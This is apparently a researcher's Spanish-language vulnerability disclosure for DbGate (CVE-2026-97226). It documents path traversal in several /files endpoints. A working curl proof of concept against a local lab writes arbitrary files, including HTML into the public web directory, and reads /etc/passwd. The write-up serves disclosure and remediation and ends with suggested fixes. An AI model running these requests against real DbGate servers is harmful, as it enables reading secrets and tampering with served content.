Arbitrary file read/write in /files_

MediumArbitrary file read/writeCVE-2026-97226
DbGateArbitrary File WriteArbitrary File ReadPath Traversal

Alcance: la validación se realizó contra un build local de DbGate master / 7.2.4-packer-beta.3. Los ejemplos utilizan únicamente un laboratorio Docker controlado. El hallazgo fue reportado mediante GitHub Security Advisory como GHSA-8x25-5rvx-jvhp; posteriormente se publicó CVE-2026-97226. El registro CVE no indica una versión corregida ni un parche.

Durante la revisión de DbGate encontré varios endpoints web expuestos bajo /files que confiaban en rutas controladas por el cliente y las pasaban directamente a operaciones como fs.writeFile, fs.copyFile y fs.readFile.

El caso más grave era POST /files/export-diagram-png, que permitía a cualquier usuario autenticado proporcionar tanto la ruta de destino como el contenido del archivo. En un despliegue web/server esto creaba una primitiva de escritura arbitraria en el filesystem del servidor, limitada únicamente por los permisos del proceso de DbGate.

También confirmé primitivas de lectura arbitraria autenticada mediante /files/download-text y /files/export-file. En el laboratorio, ambas permitieron leer /etc/passwd. La escritura también pudo alcanzar un directorio web público y servir contenido controlado desde el mismo origen de DbGate.

Endpoints afectados

  • POST /files/export-diagram-png
  • POST /files/export-chart
  • POST /files/export-map
  • POST /files/export-diagram
  • POST /files/export-file
  • POST /files/download-text

El endpoint relacionado POST /files/get-file-real-path también parecía carecer de una validación de ruta equivalente. Por sí solo es de menor severidad, pero puede revelar rutas absolutas del servidor y ayudar a combinar las primitivas de lectura y escritura.

Escritura arbitraria mediante export-diagram-png

La implementación más grave era:

async exportDiagramPng({ filePath, pngBase64 }) {
  const base64 = pngBase64.replace(/^data:image\/png;base64,/, '');
  await fs.writeFile(filePath, Buffer.from(base64, 'base64'));
  return true;
}

El endpoint no realizaba:

  • Comprobación exclusiva para Electron.
  • Comprobación de permisos específica.
  • Validación de la ruta en el servidor.
  • Restricción a un directorio aprobado de exportación o upload.
  • Validación de que el contenido decodificado fuera realmente un PNG.

Por tanto, un usuario autenticado podía controlar los dos elementos de la operación:

filePath  → destino controlado por el atacante
pngBase64 → bytes controlados por el atacante
                ↓
          fs.writeFile()

El mismo patrón aparecía en exportChart, exportMap y exportDiagram, que escribían en un filePath proporcionado por el cliente.

Lectura mediante export-file

La implementación de exportFile era:

async exportFile({ folder, file, filePath }, req) {
  const loadedPermissions = await loadPermissionsFromRequest(req);
  if (!hasPermission(`files/${folder}/read`, loadedPermissions)) return false;
  await fs.copyFile(path.join(filesdir(), folder, file), filePath);
  return true;
}

Aunque comprobaba un permiso sobre la carpeta, folder, file y filePath estaban controlados por la solicitud. El origen se construía con path.join(filesdir(), folder, file), pero no se aplicaba la misma validación checkSecureFilePathsWithoutDirectory utilizada por operaciones como delete, rename, copy, load y save.

Esto permitía usar traversal en el origen, copiar un archivo accesible para Node.js a una ubicación legible por la aplicación y recuperarlo después mediante /files/load:

folder = "."
file   = "../../../etc/passwd"
        ↓
filesdir() / . / ../../../etc/passwd
        ↓
archivo copiado a una carpeta de aplicación
        ↓
files/load devuelve el contenido

Lectura directa mediante download-text

La ruta /files/download-text ofrecía una primitiva de lectura más directa:

async downloadText({ uri }, req) {
  if (!uri) return null;
  const filePath = await dbgateApi.download(uri);
  const text = await fs.readFile(filePath, {
    encoding: 'utf-8',
  });
  return text;
}

El helper de descarga trataba de forma especial las URIs http://, https:// y zip://. Para cualquier otro valor devolvía la entrada sin modificar. Por eso una petición con {"uri":"/etc/passwd"} hacía que downloadText pasara directamente esa ruta a fs.readFile.

Patrones más seguros en el mismo controlador

El comportamiento era inconsistente con otras funciones del controlador. Operaciones como saveAs y loadFrom estaban protegidas con un guard exclusivo para Electron, mientras que simpleCopy validaba directorios mediante checkSecureDirectories en contextos server/non-Electron.

La diferencia mostraba que ya existían patrones de protección en el mismo componente, pero no se aplicaban de forma uniforme a los endpoints web expuestos.

Prueba de concepto local

La reproducción utilizó la imagen local dbgate-lab y el usuario normal hunter. El host de los ejemplos es 127.0.0.1:3100 y no representa una instalación pública.

1. Autenticación

BASE="http://127.0.0.1:3100"

JWT=$(curl -s -X POST "$BASE/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"amoid":"logins","login":"hunter","password":"hunter"}' \
  | jq -r '.accessToken')

El usuario normal se autenticó correctamente y recibió un JWT:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

2. Escritura arbitraria

Primero escribí contenido controlado en un archivo temporal:

PAYLOAD_B64=$(printf 'PWNED-DBGATE-LAB\n' | base64 -w0)

curl -s -X POST "$BASE/files/export-diagram-png" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d "{
    \"filePath\": \"/tmp/dbgate_poc_written.txt\",
    \"pngBase64\": \"$PAYLOAD_B64\"
  }"

La respuesta fue true y el contenido apareció en el filesystem del contenedor:

docker exec dbgate-lab sh -lc \
  'ls -l /tmp/dbgate_poc_written.txt && cat /tmp/dbgate_poc_written.txt'

PWNED-DBGATE-LAB

3. Escritura en el directorio web público

Para demostrar el alcance de la escritura, utilicé HTML sintético como contenido y lo dirigí al directorio público del laboratorio:

<!doctype html>
<html>
  <body>
    <h1>DBGATE-ARBITRARY-FILE-WRITE-POC-ZSZSEC</h1>
  </body>
</html>
HTML_B64=$(base64 -w0 /tmp/zszsec-poc.html)

curl -s -X POST "$BASE/files/export-diagram-png" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d "{
    \"filePath\": \"/home/dbgate-docker/public/zszsec-poc.html\",
    \"pngBase64\": \"$HTML_B64\"
  }"

El archivo escrito pudo recuperarse desde el origen de DbGate:

curl -i "$BASE/zszsec-poc.html"

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

Esto confirmó que un usuario autenticado podía modificar contenido web accesible desde el mismo origen.

4. Lectura mediante export-file

Primero preparé una carpeta legible por la aplicación:

curl -s -X POST "$BASE/files/save" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "folder": "exfil",
    "file": "placeholder.txt",
    "data": "placeholder",
    "format": "text"
  }'

Después utilicé traversal en el origen de export-file y recuperé la copia mediante files/load:

curl -s -X POST "$BASE/files/export-file" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "folder": ".",
    "file": "../../../etc/passwd",
    "filePath": "/root/.dbgate/files/exfil/passwd_copy.txt"
  }'

curl -s -X POST "$BASE/files/load" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "folder": "exfil",
    "file": "passwd_copy.txt",
    "format": "text"
  }'

La respuesta contenía el archivo copiado:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

5. Lectura directa mediante download-text

curl -s -X POST "$BASE/files/download-text" \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "uri": "/etc/passwd"
  }'

La respuesta devolvió directamente el contenido de /etc/passwd, confirmando la lectura arbitraria local autenticada.

Impacto

Un usuario autenticado normal podía leer y escribir archivos del servidor fuera de lo que debería controlar la aplicación, limitado por los permisos del proceso de DbGate.

La escritura arbitraria permitía colocar contenido controlado en cualquier ruta escribible. En el laboratorio se pudo escribir HTML/JavaScript en el directorio web público y servirlo desde el mismo origen, lo que podía permitir modificar contenido web o introducir JavaScript same-origin persistente según el despliegue.

La lectura podía realizarse directamente con /files/download-text o mediante la cadena export-file → files/load. En el laboratorio ambas rutas permitieron leer /etc/passwd.

El impacto final depende de los permisos del filesystem y de la topología del despliegue. Como mínimo, se exponían capacidades no previstas de lectura y escritura server-side a cualquier usuario autenticado. En instalaciones menos restringidas, esto puede permitir divulgar secretos, modificar contenido servido, corromper datos o alcanzar ejecución de código si se pueden sobrescribir archivos ejecutables de la aplicación.

Corrección sugerida

  • Aplicar validación server-side de rutas a todos los endpoints web de /files.
  • Restringir las operaciones a directorios de exportación o upload aprobados.
  • Resolver y canonicalizar la ruta antes de verificar que permanezca dentro del directorio permitido.
  • Rechazar traversal en folder, file, filePath y uri.
  • Aplicar guards de entorno y permisos de manera uniforme en los endpoints server/non-Electron.
  • Validar el tipo y contenido de los archivos exportados, sin confiar únicamente en el nombre o en una extensión.
  • Añadir pruebas de regresión para lectura, escritura, copia y rutas con traversal en todos los endpoints afectados.

Estado

El hallazgo fue reportado mediante GitHub Security Advisory como GHSA-8x25-5rvx-jvhp. Posteriormente se publicó CVE-2026-97226; el registro CVE indica que el vendor fue contactado, pero no especifica una versión corregida ni un parche.
